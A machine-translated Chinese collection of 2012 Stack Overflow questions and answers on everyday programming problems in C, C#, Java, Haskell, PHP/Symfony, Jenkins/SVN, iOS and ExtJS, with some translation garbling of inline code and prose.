> 时间：2012-07-31T08:37:49.160

> 在 VC# 中，当我在 .cs 文件中添加 Main 方法时，它会注意到我在这个项目中有两个 Main 条目。

然后不要添加其他`main`方法。当您创建控制台或 WinForms 应用程序时，文件 Program.cs 将包含一个 main 方法。如果您想测试某些东西，例如您编写的类，只需在现有的 main 方法中实例化该类即可。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-31T15:50:00.220

作为解决方案，为什么不向要测试的每个类添加公共 testXXXX() 方法，然后使用 1 个主要方法来调用这些 testXXXX() 方法。

# c - 将char指针数组传递给C中的函数？

> ID：11735734
> 
> 赞同：4
> 
> 时间：2012-07-31T08:07:43.580
> 
> 标签：c, arrays, pointers, char

我有以下代码：

```
int main(){
    char **array;
    char a[5];
    int n = 5;

    array = malloc(n *sizeof *array);

    /*Some code to assign array values*/

    test(a, array);

    return 0;
}

int test(char s1, char **s2){
    if(strcmp(s1, s2[0]) != 0)
        return 1;

    return 0;
} 
```

我正在尝试将 char 和 char 指针数组传递给函数，但上面的代码会导致以下错误和警告：

```
temp.c：在函数'main'中：
temp.c:6:5：警告：函数“malloc”的隐式声明 [-Wimplicit-function-declaration]
temp.c:6:13：警告：内置函数“malloc”的隐式声明不兼容 [默认启用]
temp.c:10:5：警告：函数“测试”的隐式声明 [-Wimplicit-function-declaration]
temp.c：在顶层：
temp.c:15:5：错误：“测试”的类型冲突
temp.c:15:1：注意：具有默认提升的参数类型不能匹配空参数名称列表声明
temp.c:10:5：注意：先前的“测试”隐式声明在这里
temp.c：在函数“测试”中：
temp.c:16:5：警告：函数“strcmp”的隐式声明 [-Wimplicit-function-declaration]
```

我试图了解问题所在。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-31T08:19:59.843

首先，您应该包含必要的头文件。为`strcmp`你需要`<string.h>`，为`malloc` `<malloc.h>`。此外，您至少需要在main*之前声明 test。*如果你这样做，你会注意到以下错误：

```
temp.c：在函数“测试”中：
temp.c:20:5: 警告：传递 'strcmp' 的参数 1 使指针从整数而不进行强制转换 [默认启用]
/usr/include/string.h:143:12：注意：预期为 'const char *' 但参数的类型为 'char'

```

这表明`test()`应该有一个`char *`作为第一个参数。总而言之，您的代码应如下所示：

```
#include <string.h>      /* for strcmp */
#include <malloc.h>      /* for malloc */

int test(char*,char**);  /* added declaration */    

int main(){
    char **array;
    char a[5];
    int n = 5;

    array = malloc(sizeof(*array));
    array[0] = malloc(n * sizeof(**array));

    /*Some code to assign array values*/

    test(a, array);

    free(*array); /* free the not longer needed memory */
    free(array);

    return 0;
}

int test(char * s1, char **s2){ /* changed to char* */
    if(strcmp(s1, s2[0]) != 0) /* have a look at the comment after the code */
        return 1;

    return 0;
} 
```

### 编辑

请注意，它[`strcmp`](http://en.cppreference.com/w/c/string/byte/strcmp)适用于以 null 结尾的字节字符串。如果既不`s1`也不`s2`包含空字节，则调用`test`将导致分段错误：

```
[1] 14940 分段错误（核心转储）./a.out
```

要么确保两者都包含一个空字节`'\0'`，要么使用[`strncmp`](http://en.cppreference.com/w/c/string/byte/strncmp)并更改以下的签名`test`：

```
int test(char * s1, char **s2, unsigned count){
    if(strncmp(s1, s2[0], count) != 0)
        return 1;
    return 0;
}

/* don' forget to change the declaration to 
      int test(char*,char**,unsigned)
   and call it with test(a,array,min(sizeof(a),n))
*/ 
```

你的内存分配也是错误的。`array`是一个`char**`。您分配的内存`*array`本身就是 a `char*`。你永远不会为这个特定的指针分配内存，你错过了`array[0] = malloc(n*sizeof(**array))`：

```
array = malloc(sizeof(*array));
*array = malloc(n * sizeof(**array)); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-31T08:16:24.947

你有几个问题。首先是原型是错误的。传递给函数时，数据类型`a`衰减为 char*指针，因此您需要：*

```
int test (char* s1, char** s2) { ... } 
```

但是，即使您解决了这个问题，`test`当您第一次使用它时，声明也不在范围内。您应该提供一个原型：

```
int test (char* s1, char** s2); 
```

before `main`，或者只是将整个定义（函数）移到 before `main`。

此外，不要忘记和标头，以便和`#include`的原型也可用。`string.h``stdlib.h``strcmp``malloc`

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-07-31T08:12:34.543

**错误 1**

```
temp.c:6:13: warning: incompatible implicit declaration of 
built-in function ‘malloc’ [enabled by default] 
```

你是这个意思吗？

```
array = malloc(n * sizeof(*array)); 
```

**错误 2**

```
temp.c:15:5: error: conflicting types for ‘test’
temp.c:15:1: note: an argument type that has a default promotion can’t 
             match an empty     parameter name list declaration
temp.c:10:5: note: previous implicit declaration of ‘test’ was here 
```

您正在传递数组第一个元素的地址`a`：

```
 test(a, array); 
```

所以函数签名应该是：

```
int test(char* s1, char** s2) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-31T08:12:43.500

当您将 char 数组传递给函数时，参数衰减为指针。将您的函数参数更改为

```
 int test(char* s1, char **s2);
              ^
              ^ 
```

你的代码至少应该编译

# java - 这应该是不稳定的还是结果不可预测？

> ID：11735743
> 
> 赞同：1
> 
> 时间：2012-07-31T08:08:28.460
> 
> 标签：java, multithreading, concurrency, volatile

控制线程执行的变量 是`volatile`必需的吗？`kill`

```
public class MyThread extends Thread{  

  private boolean kill = false;  

  public void killThread(){  
      kill = true;  
  }  

  @Override  
  public void run(){  
     while(!kill){  
                 //do stuff  
     }  
  }  

} 
```

例如，如果在代码的其他部分（另一个线程）中，我`theThreadRef.killThread();`应该期望线程停止还是由于没有声明为而导致结果**不可预测**？我不确定这一点，因为我通过该方法更新了。 谢谢 `kill``volatile``kill``killThread`

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-31T08:09:57.803

是的，`kill`是线程之间共享的变量，必须是`volatile`. 但是，请考虑使用 Java 的原生中断机制，包括`Thread.interrupt()`and`Thread.interrupted()`来实现您所需要的。然后你就不需要保留你自己的变量了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:28:45.050

是的。如果您不声明`kill`as `volatile`，则其他线程可能会在其他线程进行新分配后继续读取旧值。值何时或是否更新是未定义的，因此从这个意义上说，行为是不可预测的（实际上，新的赋值最终变得可见）。

然而，因为原始布尔值的分配是原子的，所以该值将始终是“正确/有效”值（即，要么是无效值，`true`要么`false`永远不会是无效值）。所以从这个意义上说，行为并不是完全不可预测的（你的代码不会崩溃等）。`long`请注意，类型或非原始对象并非如此。原始 int 类型也具有与原始 boolean 相同的属性，这在标准库的 String 类实现中用于优化哈希码计算。

# haskell - 您能否计算列表理解中的匹配项（尝试在阈值后对 qsort 进行插入排序）

> ID：11735744
> 
> 赞同：2
> 
> 时间：2012-07-31T08:08:28.570
> 
> 标签：haskell

我来自 C++ 背景，所以我不确定我是否能正确处理这个问题。但是我要做的是编写快速排序，但如果列表的长度小于某个阈值，则回退到插入排序。到目前为止，我有这个代码：

```
insertionSort :: (Ord a) => [a] -> [a]
insertionSort [] = []
insertionSort (x:xs) = insert x (insertionSort xs)

quickSort :: (Ord a) => [a] -> [a]
quickSort x = qsHelper x (length x)

qsHelper :: (Ord a) => [a] -> Int -> [a]
qsHelper [] _ = []
qsHelper (x:xs) n 
    | n <= 10 = insertionSort xs
    | otherwise =  qsHelper before (length before) ++ [x] ++ qsHelper after (length after)
        where
            before = [a | a <- xs, a < x]
            after = [a | a <- xs, a >= x] 
```

现在我关心的是每次计算每个列表的长度。我不完全理解 Haskell 如何优化事物或惰性评估对上述代码的完整影响。但似乎在列表理解之前和之后计算每个列表的长度不是一件好事？有没有办法让您在执行列表推导时提取列表推导中发生的匹配数？

即，如果我们有`[x | x <- [1,2,3,4,5], x > 3]`（导致 [4,5]）我可以在不使用长度调用的情况下获得 [4,5] 的计数吗？

感谢您的任何帮助/解释！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-31T08:46:57.340

简短的回答：没有。

不那么简短的回答：是的，你可以伪造它。`import Data.Monoid`， 然后

```
 | otherwise =  qsHelper before lenBefore ++ [x] ++ qsHelper after lenAfter
        where
            (before, Sum lenBefore) = mconcat [([a], Sum 1) | a <- xs, a < x]
            (after, Sum lenAfter) = mconcat [([a], Sum 1) | a <- xs, a >= x] 
```

* * *

更好的答案：你不想。

避免的常见原因`length`包括：

*   它的运行时间是 O(N)
    *   但无论如何构建列表需要花费我们 O(N)
*   它强制列表脊椎严格
    *   但是我们正在对列表进行排序：我们必须（至少部分地）评估每个元素，以便知道哪个是最小值；列表脊椎已经被迫严格
*   如果您不在乎列表有多长，无论它是否比另一个列表或阈值短/长，`length`都是浪费的：它会一直走到列表的末尾，不管
    *   答对了

```
isLongerThan :: Int -> [a] -> Bool
isLongerThan _ []     = False
isLongerThan 0 _      = True
isLongerThan n (_:xs) = isLongerThan (n-1) xs

quickSort :: (Ord a) => [a] -> [a]
quickSort []     = []
quickSort (x:xs) 
    | not (isLongerThan 10 (x:xs)) = insertionSort xs
    | otherwise =  quickSort before ++ [x] ++ quickSort after
        where
            before = [a | a <- xs, a < x]
            after = [a | a <- xs, a >= x] 
```

但是，这里真正的低效率是 in`before`和`after`。他们都遍历整个列表，将每个元素与`x`. 因此，我们将逐步执行`xs`两次，并将每个元素与`x`两次进行比较。我们只需要做一次。

```
 (before, after) = partition (< x) xs 
```

[`partition`](http://www.haskell.org/ghc/docs/latest/html/libraries/base/Data-List.html#v%3apartition)在 Data.List 中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:43:15.403

不，没有办法使用列表推导同时进行过滤并计算找到的元素的数量。但是，如果您担心这种性能损失，您不应该像一开始那样使用列表推导式：您正在过滤列表两次，因此将谓词`<x`及其否定应用于每个元素。更好的变体是

```
(before, after) = partition (< x) xs 
```

从此开始编写函数并不难

```
partitionAndCount :: (a -> Bool) -> [a] -> (([a],Int), ([a],Int)) 
```

同时对列表进行分区和计数，并对每个返回列表中的元素进行计数：

```
((before, lengthBefore), (after, lengthAfter)) = partitionAndCount (< x) xs 
```

这是一个可能的实现（具有稍微重新排序的类型）：

```
{-# LANGUAGE BangPatterns #-}
import Control.Arrow

partitionAndCount :: (a -> Bool) -> [a] -> (([a], [a]), (Int, Int))
partitionAndCount p = go 0 0
    where go !c1 !c2 [] = (([],[]),(c1,c2))
          go !c1 !c2 (x:xs) = if p x 
                              then first (first (x:))  (go (c1 + 1) c2 xs)
                              else first (second (x:)) (go c1 (c2 + 1) xs) 
```

在这里你可以看到它的实际效果：

```
*Main> partitionAndCount (>=4) [1,2,3,4,5,3,4,5]
(([4,5,4,5],[1,2,3,3]),(4,4)) 
```

# testing - JUnit 测试在不同的文件夹中找不到类

> ID：11735749
> 
> 赞同：1
> 
> 时间：2012-07-31T08:08:49.633
> 
> 标签：testing, junit, console, classpath, subdirectory

我想从控制台运行我的测试，所以我写了一个小程序（klasse.java）：

```
package nl.user;

public class klasse {
public static int sum(int a,int b){
return a+b;  
 }
} 
```

和一个测试（mainTest.java）：

```
package nl.user.TestPackage;
import static org.junit.Assert.*;
import nl.user.klasse;
import org.junit.Test;

public class mainTest2 {
@Test
public void test() {
    assertEquals(10, klasse.sum(7,3));
    }
} 
```

只要两个 .class 文件都在同一个文件夹中，一切都可以正常工作。但是在我所有的其他程序中，我的程序和测试都在不同的文件夹中。如您所见，程序位于“.../nl/user”方向，测试位于子文件夹“.../nl/user/TestPackage”中。

如果我使用以下 .bat 文件运行测试文件：

设置 CLASSPATH=,;%CLASSPATH%;C:\Users\myname\Downloads\eclipse-SDK-4.2-win32-x86_64\eclipse\plugins\org.junit_4.10.0.v4_10_0_v20120426-0900\junit.jar;C:\Users \myname\workspace\JUnitTest\bin\nl\user;C:\Users\myname\workspace\JUnitTest\bin\nl\user\TestPackage;C:\Users\nlagemann\workspace\JUnitTest\src\nl\user;C :\Users\nlagemann\workspace\JUnitTest\tests\nl\user\TestPackage

java org.junit.runner.JUnitCore mainTest2

暂停

（是的，不是所有的 CLASSPATH 都需要）

我得到：

```
Exception in thread "main" java.lang.NoClassDefFoundError: mainTest2 (wrong name
: nl/user/TestPackage/mainTest2)
    at java.lang.ClassLoader.defineClass1(Native Method)
    at java.lang.ClassLoader.defineClass(Unknown Source)
    at java.security.SecureClassLoader.defineClass(Unknown Source)
    at java.net.URLClassLoader.defineClass(Unknown Source)
    at java.net.URLClassLoader.access$100(Unknown Source)
    at java.net.URLClassLoader$1.run(Unknown Source)
    at java.net.URLClassLoader$1.run(Unknown Source)
    at java.security.AccessController.doPrivileged(Native Method)
    at java.net.URLClassLoader.findClass(Unknown Source)
    at java.lang.ClassLoader.loadClass(Unknown Source)
    at sun.misc.Launcher$AppClassLoader.loadClass(Unknown Source)
    at java.lang.ClassLoader.loadClass(Unknown Source)
    at java.lang.Class.forName0(Native Method)
    at java.lang.Class.forName(Unknown Source)
    at org.junit.runner.JUnitCore.runMain(JUnitCore.java:89)
    at org.junit.runner.JUnitCore.runMainAndExit(JUnitCore.java:53)
    at org.junit.runner.JUnitCore.main(JUnitCore.java:45) 
```

我想我必须做某事。使用 CLASSPATH 但我不知道是什么：/

# c# - 向下转换以访问子类中的其他事件和方法

> ID：11735754
> 
> 赞同：0
> 
> 时间：2012-07-31T08:09:11.800
> 
> 标签：c#, .net, winforms

我想通过向它添加新的事件和方法来专门化一个基类。例如，B 类继承自 A 类。但是，如果在代码中我持有对 B 类实例的引用作为其基类型，A。每次我需要从 B 访问某些东西时，我是否需要向下转换，例如订阅EventB1，还是调用MethodB1？

```
if (obj is B) 
{ 
  B m = (B)obj;
  m.EventB1 += EventHandlerB1; 
} 
```

另外，如果我在上面的基类中有一个 switch 语句。在 B 中添加更多案例是不好的做法吗？

```
Class A
{
  public event EventHandler EventA1

  public void MethodA1()
  {
    //some code
  }

  protected virtual void ProcessWorkItem(workItem type)
  {
    switch (type)
    {
      case workItem.A1:
        ..
        break;
      case workItem.A2:
        ..
        break;
      case workItem.A3:
        ..
        break;
    }
  }
}

Class B : A
{
  public event EventHandler EventB1

  public void MethodB1()
  {
    //some code
  }

  protected override void ProcessWorkItem(workItem type)
  {
    base.ProcessWorkItem(type);

    switch (type)
    {
      case workItem.B1:
        ..
        break;
      case workItem.B2:
        ..
        break;
      case workItem.B3:
        ..
        break;
    }
  }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:14:28.993

> 每次我需要从 B 访问某些东西时，我是否需要向下转换，例如订阅 EventB1，或调用 MethodB1？

绝对地。这应该告诉你这里有一种设计的味道。这并不意味着它*一定*很糟糕，但它至少应该促使您考虑是否有更清洁的方法。

> 另外，如果我在上面的基类中有一个 switch 语句。在 B 中添加更多案例是不好的做法吗？

如果不知道更多关于它试图做什么，很难说清楚。目前尚不清楚使用组合而不是继承是否会对您有所帮助，但这通常是值得考虑的事情。您可能还想考虑使用接口——两者都`A`可以`B`实现相同的接口，如果需要的话可以`B`组合一个。`A`也许。很难说：）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:31:03.013

是的，要访问 B 类型的方法，您必须将对象转换为 B 类型。如果您绝对不想这样做，您可以使用反射来调用 repsective 方法。但是，如果不了解您想要做什么，我不建议这样做。

此外，想到与事件相关的内容：如果要调用事件，则必须从声明它的类中实现的代码中执行此操作。

关于开关：我认为这取决于。第一件事......我会使用覆盖，然后，根据这个函数的作用/服务，调用 base 与否。

问候，马丁

```
Class A
{
  public event EventHandler EventA1

  public void MethodA1()
  {
    //some code
  }

  protected virtual void FireEventA1()
  {
    if (EventA1 != null)
      EventA1(new EventArgs());
  }

  protected virtual void ProcessWorkItem(workItem type)
  {
    switch (type)
    {
      case workItem.A1:
        ..
        break;
      case workItem.A2:
        ..
        break;
      case workItem.A3:
        ..
        break;
    }
  }
}

Class B : A
{
  public event EventHandler EventB1

  public void MethodB1()
  {
    //some code
  }

  protected virtual void FireEventB1()
  {
    if (EventB1 != null)
      EventB1(new EventArgs());
  }

  protected override void ProcessWorkItem(workItem type)
  {
    base.ProcessWorkItem(type);
    switch (type)
    {
      case workItem.B1:
        ..
        break;
      case workItem.B2:
        ..
        break;
      case workItem.B3:
        ..
        break;
    }
  }
} 
```

# php - Symfony 1.4，存储上传的文件大小和名称

> ID：11735760
> 
> 赞同：0
> 
> 时间：2012-07-31T08:09:30.583
> 
> 标签：php, file-upload, symfony1, symfony-1.4, symfony-forms

我`sfWidgetFormInputFileEditable`在我的表单中使用文件处理目的。这是代码：

```
 /* File */
$this->widgetSchema['file_addr'] = new sfWidgetFormInputFileEditable(array(
    'label' => 'File',
    'file_src' => sfConfig::get('sf_root_dir').'...',
    'is_image' => false,
    'edit_mode' => !$this->getObject()->isNew(),
    'delete_label' => 'Delete?',
    'template' => '...',
    'with_delete' => true
));
$this->validatorSchema['file_addr'] = new sfValidatorFile(array(
    'required' => $this->getObject()->isNew(),
    'path' => sfConfig::get('sf_root_dir') .'/files'
));
$this->validatorSchema['file_addr_delete'] = new deleteFileValidator(...);
/* File: END */ 
```

这样，它将生成的文件名存储在`file_addr`字段中。我想访问其他文件数据，如大小、文件名等，并将它们也存储在数据库中。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:17:58.383

您可以覆盖 save() 方法。

```
public function save($con = null) {
  $values = $this->getValues();
  $fileAddr = $values['file_addr'];

  // ... Do stuff with the values ...

  return parent::save($con);
} 
```

我没有测试它，但类似的东西应该可以工作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T10:16:12.487

其他上传的文件数据在表单`processValues`方法中可用。所以我像这样覆盖它：

```
 public function processValues($values)
  {
    /* File data */
    if ($values['file_addr'] instanceof sfValidatedFile)
    {
       $file = $values['file_addr'];
       $this->getObject()->setFileSize($file->getSize());
       $this->getObject()->setFileType($file->getType());
       $this->getObject()->setFileHash(md5_file($file->getTempName()));
    }
    return parent::processValues($values);
  } 
```

# svn - 詹金斯/哈德森 SVN 问题

> ID：11735761
> 
> 赞同：6
> 
> 时间：2012-07-31T08:09:33.640
> 
> 标签：svn, hudson, jenkins, hudson-plugins, jenkins-plugins

我的 Jenkins 安装有一个（奇怪的）问题，这基本上导致 SVN 更新在备用基础上失败。

堆栈跟踪显示两个问题：

```
hudson.util.IOException2: revision check failed on (my repo).... 
```

和

```
Caused by: org.tmatesoft.svn.core.SVNException: svn: OPTIONS (my repo) 
```

如果我在发生这种情况后重新运行构建，一切正常。

标记

由具有完全相同问题的甘德斯编辑：

这是我机器上导致此错误的堆栈跟踪。当它尝试访问 SVNExternals 目录 (.../trunk/common) 时似乎会发生这种情况，并且由于某种原因，它在第一次尝试访问时没有凭据。然后下一次，它工作得很好：

> hudson.util.IOException2： [https ://myserver.com/....../TrialsMobile/trunk/common 上的修订检查失败](https://myserver.com/....../TrialsMobile/trunk/common) core.wc2.SvnOperation.run(SvnOperation.java:294) at org.tmatesoft.svn.core.wc.SVNLogClient.doLog(SVNLogClient.java:967) at org.tmatesoft.svn.core.wc.SVNLogClient.doLog( SVNLogClient.java:872) at hudson.scm.SubversionChangeLogBuilder.buildModule(SubversionChangeLogBuilder.java:177) ... 11 更多原因：org.tmatesoft.svn.core.SVNCancelException: svn: E200015: 没有凭证可以尝试。org.tmatesoft.svn.core.internal.wc.SVNErrorManager.cancel(SVNErrorManager.java:32) 的 org.tmatesoft.svn.core.internal.wc.SVNErrorManager.cancel(SVNErrorManager.java:32) 的身份验证失败.tmatesoft.svn.core.internal.wc.DefaultSVNAuthenticationManager.getFirstAuthentication(DefaultSVNAuthenticationManager.java:185) 在 org.tmatesoft.svn.core.internal.io.dav.http.HTTPConnection._request(HTTPConnection.java:

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-07-22T19:00:06.137

你不是唯一一个[有这个问题](https://stackoverflow.com/questions/22333860/jenkins-fails-all-the-time-with-hudson-util-ioexception2)的人。

它看起来像您的构建工作的原因是因为这发生在修订检查（我需要构建吗？），并且当您通过按下*立即构建按钮进行**重建*时，它工作正常。让我们尝试一些事情：

 **   首先，您使用的是插件的最新版本吗？如果您退回到 Subversion 插件的先前版本怎么办？如果您不在插件的最新版本上，您可以升级到它吗？
*   检查您的配置。您是否指定凭据？如果没有，请尝试指定凭据并查看是否有帮助。
*   看看这个[新功能（而不是一个错误](https://issues.jenkins-ci.org/browse/JENKINS-22078).
*   看看这篇[博文](http://blog.vinodsingh.com/2009/08/hudson-svn-authentication-cancelled.html)。

看起来在 2.0 版的 Jenkins 的 SVN 插件中添加了一个~~错误引入~~ ***功能，该功能改变了对外部进行身份验证的方式。***添加惊喜功能是程序员社区的主要死因。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T13:22:48.033

这些错误行都没有说明问题。如果您可以获取 svn 日志，请发布它们。

如果它交替失败，则可能是访问问题，可能您有权读取但不能写入 repo，或者系统的一部分用户名/密码错误。也许您在 jenkins 配置的一部分中的 svn url 中输入了一个错字。像这样的东西是我首先要看的地方。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-07-31T10:32:38.117

错误来自 SVN。所以你可以尝试在SVN中新建一个目录。您也可以尝试使用 IP 代替主机名。如果您可以尝试，请与一些网络专家一致。*

# ios - 为 NSKeyedArchiver 和 NSKeyedUnarchiver 拆分数据

> ID：11735762
> 
> 赞同：0
> 
> 时间：2012-07-31T08:09:36.377
> 
> 标签：ios, objective-c, nskeyedarchiver, nscoding

编辑（2012 年 10 月 22 日）：希望以更清晰的方式重申这个问题。

本质上，我正在寻找的是一些可以在多个位置之间（取消）归档的 NSCoder。一些编码对象图元应保存在位置 A，而其他编码对象图元应保存在指定位置 B，等等。

例如，假设我们有一个这样的类：

```
@interface SomeClass
{
   NSString *ivar1;
   NSString *ivar2;
   NSString *ivar3;

   SomeClass *ivarZ;
}

...

@end 
```

某处我们有一个实例：

```
SomeClass *someObject; 
```

我想要做的是类似于以下保存：

```
NSData *prefDat = [KeyedMultiArchiver archiveRootObject:someObject
                                       withPartitionKey:@"DataForNSUserDefaults"];
NSData *permDat = [KeyedMultiArchiver archiveRootObject:someObject
                                       withPartitionKey:@"DataForPermanentStorage"];
/* save prefDat to NSUserDefaults */;
/* save permDat to some appropriate NSURL */; 
```

然后在取消归档：

```
SomeClass *anotherObject = [SomeClass new];

NSData *prefDat = /* get from NSUserDefaults */;
NSData *permDat = /* get from appropriate NSURL */;

[KeyedMultiUnarchiver unarchiveData:prefDat
                         intoObject:anotherObject
                   withPartitionKey:@"DataForNSUserDefaults"];

[KeyedMultiUnarchiver unarchiveData:permDat
                         intoObject:anotherObject
                   withPartitionKey:@"DataForPermanentStorage"]; 
```

where `ivar1`s 可能会被保存到`NSUserDefaults`并且`ivar2`s, `ivar3`s 到磁盘的某个地方。

我可能最终会为此编写自己的解决方案，但是如果你们想出任何出色的替代方案，请告诉我！

将发布最终产品。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-02T09:01:55.750

好吧，这是我最终提出的解决方案：

[https://github.com/xelxebar/BWPartitioning](https://github.com/xelxebar/BWPartitioning)

这不是继承 NSCoder，而是纯粹的自定义框架。上面的存储库是一个 XCode 项目，应该开箱即用。评论很少，而且它非常 alpha，但对它的预期使用模式有一些解释。

随意使用它，但是您可以和/或提出任何问题。反馈表示赞赏。

干杯!

# xamarin.ios - MVVMCross - SqlBits 内存泄漏

> ID：11735764
> 
> 赞同：1
> 
> 时间：2012-07-31T08:09:41.677
> 
> 标签：xamarin.ios, mvvmcross

我们正在开发一个带有 MVVMCross 的 Monotouch 应用程序，类似于 SqliBits 示例（UINavigationCONtroller 有一个选项卡控制器，在选项卡控制器内部有另一个导航控制器）。似乎内存被分配但从未释放。

要重现此错误，请使用分析器选择 Sessions 选项卡启动 SqliBits 示例，然后选择返回日期，选择返回日期，...然后查看内存分配，您将看到内存已分配但从未释放.

我被允许附加图像，但重现错误相当容易。

问候，丹

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T12:03:36.970

作为一个问题，这已在[https://github.com/slodge/MvvmCross/issues/19上进行了讨论](https://github.com/slodge/MvvmCross/issues/19)

iOS 仅在内存不足时释放视图（通过视图控制器 ViewDidUnload 方法）——在模拟器中，这可以从硬件菜单中人为地创建。

除此之外，还有一个小的内存泄漏，看起来它是由 RelayCommand 的 Action 字段中对 ViewModel 的引用引起的。我并不完全清楚是什么原因造成的，但是将 Dispose 方法添加到 RelayCommand 使此 Action 无效似乎已经解决了问题（请参阅[https://github.com/slodge/MvvmCross/commit/8fc1af3fc9960445b5358daf8111f6bc9683b907](https://github.com/slodge/MvvmCross/commit/8fc1af3fc9960445b5358daf8111f6bc9683b907)）

# iphone - 在超级视图中开始触摸时接收 touchesMoved

> ID：11735765
> 
> 赞同：2
> 
> 时间：2012-07-31T08:09:44.970
> 
> 标签：iphone, ios, cocoa-touch

`touchesMoved`在 iOS 中，即使在超级视图中开始触摸时，我也希望在子视图中接收事件！理想情况下，我还希望`touchesBegan`在移动手指到达子视图时收到。

实现这一目标的最佳方法是什么？我想我可以在超级视图中覆盖`touchesMoved:withEvent:`，进行命中测试，然后调用子视图，但是有更好的解决方案吗？（我曾尝试在 superview 中辞去第一响应者的职务，但这没有帮助）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-03-21T00:10:38.860

我今天必须解决这个完全相同的问题，而我刚刚做到了。

比如说，您有以下内容——这正是我的案例的抽象描述：

*   包含按钮和子视图的主视图
*   当触摸在主视图上开始时，您希望在子视图上接收触摸事件
*   一个例外是该按钮：如果您在主视图中点击该按钮，则该按钮应处理该按钮

解决方案是覆盖`-hitTest:withEvent:`方法。该方法的目的是返回应该处理触摸的视图。

您有两个选择：在子视图中覆盖它或在主视图中覆盖它。如果您希望所有触摸都由子视图处理，您可以让`-hitTest:withEvent`子视图返回`self`并完成它。在我的情况下，我仍然需要主视图上的按钮有自己的触摸检测，所以我的解决方法是覆盖`-hitTest:withEvent:`主视图上的方法，如下所示：

```
- (UIView *)hitTest:(CGPoint)point withEvent:(UIEvent *)event
{
    if (CGRectContainsPoint(self.myButton.frame, point))
    {
        return self.myButton;
    }
    else
    {
        return self.mySubView;
    }
} 
```

这就像一个绝对的魅力！希望这也适用于你:-)

你当然应该修改里面的细节`-hitTest:withEvent:`以满足你的特定需求——也许你想把这个覆盖限制在一个特定的区域或一组特定的控件——但关键是这个线程上主要问题的答案在于对此的覆盖`-hitTest:withEvent:`方法的覆盖。

埃里克

# forms - 如何在只读字段上禁止焦点

> ID：11735768
> 
> 赞同：3
> 
> 时间：2012-07-31T08:09:50.253
> 
> 标签：forms, extjs, field, readonly

我们有一个表单，其中很少有标记为只读的字段。

问题是用户能够使用鼠标或键盘选项卡聚焦或导航到这些只读字段，我们希望禁止这样做。

不允许这样做的一种方法是将所有此类字段标记为“已禁用”。但是当标记为禁用时，虽然字段不能被聚焦，但是这些禁用的字段也不会被提交到服务器，这不是预期的。

因此，我们如何防止对 readOnly 字段的关注？

PS：不允许关注只读字段的原因是为了通过键盘提供更好的导航，以便通过使用 Tab 键，用户只能导航或跳转他可以编辑的那些字段，并且所有只读字段都会被忽略。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:59:50.807

您可以将侦听器添加到侦听焦点事件的基 Field 类，然后如果该字段是只读的以关注下一个组件。

```
listeners: {
    focus: function(field)
    {                       
        if (field.readOnly)
        {
            field.nextSibling().focus();
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T18:00:17.303

只需覆盖 getSubmitData 方法并分配一些其他属性，让被覆盖的方法知道您要提交（例如 forceSubmit）：

```
Ext.define('My.form.Field', {
    override: 'Ext.form.field.Field',

    getSubmitData: function() {
        var me   = this,
            data = null;

        if ( me.disabled && me.readOnly && me.forceSubmit ) {
            data = {};
            data[me.getName()] = '' + me.getValue();
        }
        else {
            return me.callParent();
        }

        return data;
    }
}); 
```

然后你可以在你的代码中要求这个类，并设置你需要被禁用、只读和强制提交的字段：

```
my field = new Ext.form.field.Text({
    disabled:    true,
    readOnly:    true,
    forceSubmit: true,

    value: 'foo'
}); 
```

这应该够了吧。

# java - 如何放置 JFrame 图标

> ID：11735770
> 
> 赞同：1
> 
> 时间：2012-07-31T08:09:51.070
> 
> 标签：java, swing, resources, icons, jframe

我想在 Java 中为我的应用程序设置一个图标。我正在使用 Eclipse。

我不知道将图标（以及配置文件）存储到项目中的方式是否是最好的（我接受学习最佳方式的建议）。

无论如何，我正在尝试将此行用于我的扩展 JFrame 类：

```
setIconImage(Toolkit.getDefaultToolkit().getImage("img/icon.png")); 
```

但不起作用：仍然带有咖啡杯图标。

如何将图标访问到包 estacionBase.img 中？有更好的地方存放吗？那时我将如何访问它？

![在此处输入图像描述](../Images/97763c305740076d9d7a0db6877f468c.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T08:14:11.027

与其将资源与源文件一起保存，不如将其保存`src`在名为`res`. 将源与资源分开是个好主意。

至于图标，请使用`setIconImage(ImageIO.read("res/icon.png"));`

**然而：**

如果您的图标在 a 内`jar`，则必须使用`ImageIO.read(Classname.class.getResource("res/icon.png"));`

我认为这是正确的，但是请注意您的相对路径，如果它不起作用，首先要检查的是您的路径相对于它的执行位置（无论是来自 .class 目录还是来自某个阶段的 jar） .

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T08:32:01.557

对于保存问题：在您的项目中创建一个新的源文件夹并将其命名为*res*左右。然后你可以把你的资源放在那里。由于*res*被标记为源文件夹，它也将在您的 jar 中。

对于加载，您可以使用

```
setIconImage(ImageIO.read("res/icon.png")); 
```

或者

```
setIconImage(
    new ImageIcon(getClass().getResource("res/icon.png"), description).getImage()
); 
```

